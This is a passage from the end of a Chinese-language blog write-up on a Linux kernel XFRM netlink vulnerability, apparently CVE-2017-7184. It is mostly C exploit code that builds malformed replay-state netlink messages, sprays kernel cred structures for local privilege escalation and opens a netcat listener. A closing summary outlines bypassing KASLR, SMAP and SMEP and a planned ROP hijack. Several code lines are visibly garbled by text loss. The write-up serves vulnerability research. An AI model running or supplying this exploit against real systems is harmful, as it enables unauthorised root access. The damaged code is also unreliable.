        if (resultnlmsg_len = NLMSG_LENGTH(len);
        nlhdr->nlmsg_flags = NLM_F_REQUEST;
        nlhdr->nlmsg_pid = getpid();
        nlhdr->nlmsg_type = XFRM_MSG_NEWSA;
        data = NLMSG_DATA(nlhdr); 
        struct xfrm_usersa_info xui;
        memset(&xui,0,sizeof(xui));
        xui.family = AF_INET;
        xui.id.proto = IPPROTO_AH;
        xui.id.spi = spi;
        xui.id.daddr.a4 = inet_addr("127.0.0.1");
        xui.lft.hard_byte_limit = 0x10000000;
        xui.lft.hard_packet_limit = 0x10000000;
        xui.lft.soft_byte_limit = 0x1000;
        xui.lft.soft_packet_limit = 0x1000;
        xui.mode = XFRM_MODE_TRANSPORT;
        xui.flags = XFRM_STATE_ESN;
        memcpy(data,&xui,sizeof(xui));
        data += sizeof(xui);
        struct nlattr nla;
        struct xfrm_algo xa;
        memset(&nla, 0, sizeof(nla));
        memset(&xa, 0, sizeof(xa));
        nla.nla_len = sizeof(xa) + sizeof(nla);
        nla.nla_type = XFRMA_ALG_AUTH;
        strcpy(xa.alg_name, "digest_null");
        xa.alg_key_len = 0;
        memcpy(data, &nla, sizeof(nla));
        data += sizeof(nla);
        memcpy(data, &xa, sizeof(xa));
        data += sizeof(xa);
        struct xfrm_replay_state_esn rs;
        memset(&nla, 0, sizeof(nla));
        nla.nla_len =  sizeof(nla)+sizeof(rs) +bmp_len*8*4;
        nla.nla_type = XFRMA_REPLAY_ESN_VAL;    
        rs.replay_window = bmp_len;
        rs.bmp_len = bmp_len;
        memcpy(data,&nla,sizeof(nla));
        data += sizeof(nla);
        memcpy(data, &rs, sizeof(rs));
        data += sizeof(rs); 
        memset(data,'1',bmp_len*4*8);
        iov.iov_base = (void *)nlhdr;
        iov.iov_len = nlhdr->nlmsg_len;
        memset(&msg, 0, sizeof(msg));
        msg.msg_name = (void *)&(nladdr);
        msg.msg_namelen = sizeof(nladdr);
        msg.msg_iov = &iov;
        msg.msg_iovlen = 1;
        //dump_data(&msg,iov.iov_len);
        err = sendmsg (sock, &msg, 0); 
        if (errnlmsg_len = NLMSG_LENGTH(len);
        nlhdr->nlmsg_flags = NLM_F_REQUEST|NLM_F_REPLACE;
        nlhdr->nlmsg_pid = getpid();
        nlhdr->nlmsg_type = XFRM_MSG_NEWAE;
        data = NLMSG_DATA(nlhdr); 
        struct xfrm_aevent_id xai;
        memset(&xai,0,sizeof(xai));
        xai.sa_id.proto = IPPROTO_AH;
        xai.sa_id.family = AF_INET;
        xai.sa_id.spi = spi;
        xai.sa_id.daddr.a4 = inet_addr("127.0.0.1");
        memcpy(data,&xai,sizeof(xai));
        data += sizeof(xai);    
        struct nlattr nla;
        memset(&nla, 0, sizeof(nla));
        struct xfrm_replay_state_esn rs;
        memset(&nla, 0, sizeof(nla));
        nla.nla_len =  sizeof(nla)+sizeof(rs) +bmp_len*8*4;
        nla.nla_type = XFRMA_REPLAY_ESN_VAL;    
        rs.replay_window = evil_windows;
        rs.bmp_len = bmp_len;
        rs.seq_hi = seq_hi;
        rs.seq = seq;   
        memcpy(data,&nla,sizeof(nla));
        data += sizeof(nla);
        memcpy(data, &rs, sizeof(rs));
        data += sizeof(rs); 
        memset(data,'1',bmp_len*4*8);
        iov.iov_base = (void *)nlhdr;
        iov.iov_len = nlhdr->nlmsg_len;
        memset(&msg, 0, sizeof(msg));
        msg.msg_name = (void *)&(nladdr);
        msg.msg_namelen = sizeof(nladdr);
        msg.msg_iov = &iov;
        msg.msg_iovlen = 1;
        err = sendmsg (sock, &msg, 0); 
        if (err> 2) - 2;
        memcpy(data,&ah,sizeof(ah));
        iov.iov_base = (void *)data;
        iov.iov_len = 4096;
        memset(&msg, 0, sizeof(msg));
        msg.msg_name = (void *)&(sai);
        msg.msg_namelen = sizeof(sai);
        msg.msg_iov = &iov;
        msg.msg_iovlen = 1;
        //dump_data(&msg,iov.iov_len);
        //dump_data(nlhdr,iov.iov_len);
        err = sendmsg (sock, &msg, 0); 
        if (err<0){
            perror("[-] bad sendmsg");
            return -1;      
        }
        return err; 
    }
    int main(int argc, char const *argv[])
    {
        int spary_n=0xc00,err,xfrm_socket,recvfd,sendfd;
        unsigned int time = 1;
        xfrm_socket=init_xfrm_socket();
        if (xfrm_socket<0){
            fprintf(stderr, "[-] bad init xfrm socket\n");
            exit(-1);
        }
        fprintf(stderr, "[+] init xfrm_socket %d \n",xfrm_socket);
        recvfd = init_recvfd();
        if (recvfd<0){
            fprintf(stderr, "[-] bad init_recvfd\n");
            exit(-1);
        }
        fprintf(stderr, "[+] init recvfd : %d \n",recvfd);
        sendfd = init_sendfd();
        if (recvfd<0){
            fprintf(stderr, "[-] bad sendfd\n");
            exit(-1);
        }
        fprintf(stderr, "[+] init sendfd : %d \n",sendfd);
        //return 0;
        fprintf(stderr, "[+] start spary %d creds \n",spary_n );
        fork_spary_n(spary_n,time);
        sleep(5);
        err=xfrm_add_sa(xfrm_socket,4869,0x24);
        if (err<0){
            fprintf(stderr, "[-] bad xfrm_add_sa\n");
            exit(-1);
        }
        fprintf(stderr, "[+] xfrm_add_sa : %d \n",err);
        err=xfrm_new_ae(xfrm_socket,4869,0x24,0xc01,0xb40,1);   
        if (err<0){
            fprintf(stderr, "[-] bad xfrm_new_ae\n");
            exit(-1);
        }
        fprintf(stderr, "[+] xfrm_new_ae : %d \n",err); 
        fork_spary_n(spary_n,10);
        sendah(sendfd,4869, htonl(0x1743));
        system("nc -lp 2333");
    }
最终效果：
## 总结
与之前调试过的漏洞不同在于此漏洞的触发使用了`netlink`这样的通信机制，因此手册上相关的资料不是很多，需要根据源代码来构造协议中的相应字段。
本文的分析基于的方法利用了该系统内`cred`申请是通过`kmalloc-192`这个`kmem_cache`得到的，虽然可以有效绕过`kaslr`、`SMAP`、`SMEP`保护，但如果`cred`申请通过的是`cred_jar`，则这个方法不一定会成功。
关于长亭博客中提到的方法，我也还在尝试。利用思路是用每次写1`bit`的方法，多次写达到覆盖下一`xfrm_replay_state_esn`中的`bmp_len`，从而越界读泄露地址来绕过`kaslr`。并且可以通过越界写的方法来写如`file_operations`、`tty_struct`这样的虚表结构，达到劫持控制流的目的，将`ROP`数据通过`do_msgsnd`这样的函数布置在内核里，从而绕过`SMEP`和`SMAP`，最终利用控制流劫持跳转回`ROP`。希望可以在后续分析中调出这种方法。
# Reference
[1] `https://zhuanlan.zhihu.com/p/26674557`
[2]
`https://github.com/snorez/blog/blob/master/cve-2017-7184%20(%E9%95%BF%E4%BA%AD%E5%9C%A8Pwn2Own%E4%B8%8A%E7%94%A8%E4%BA%8E%E6%8F%90%E6%9D%83Ubuntu%E7%9A%84%E6%BC%8F%E6%B4%9E)%20%E7%9A%84%E5%88%86%E6%9E%90%E5%88%A9%E7%94%A8.md`
[3] `https://elixir.bootlin.com/linux/v4.10.6/source/net/xfrm`
[4] `https://bbs.pediy.com/thread-249192.htm`
[5] `http://blog.chinaunix.net/uid-26675482-id-3255770.html`
[6] `http://onestraw.github.io/linux/netlink-event-signal/`
[7] `http://www.man7.org/linux/man-pages/man7/netlink.7.html`
[8] `https://github.com/ret2p4nda/linux-kernel-exploits/blob/master/2017/CVE-2017-7308/poc.c`